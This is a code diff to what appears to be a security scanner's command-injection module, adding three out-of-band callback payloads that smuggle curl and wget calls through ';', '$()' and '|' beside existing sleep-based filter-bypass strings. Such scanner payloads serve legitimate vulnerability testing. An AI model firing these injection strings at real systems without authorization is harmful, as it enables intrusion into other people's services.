@@ -100,6 +100,11 @@ class CmdInjector(BaseInjector):
             ";sl$(x)eep 3",                   # char splitting
             "; {sleep,3}",                     # brace expansion
             ";s]lee[p 3",                      # bracket bypass attempt
+
+            # ── OOB callbacks (blind detection) ──
+            f"; curl {self._get_oob_url()}/cmd/oob1 #",
+            f"$(curl {self._get_oob_url()}/cmd/oob2)",
+            f"| wget -q {self._get_oob_url()}/cmd/oob3",
         ]
 
     def analyze_response(
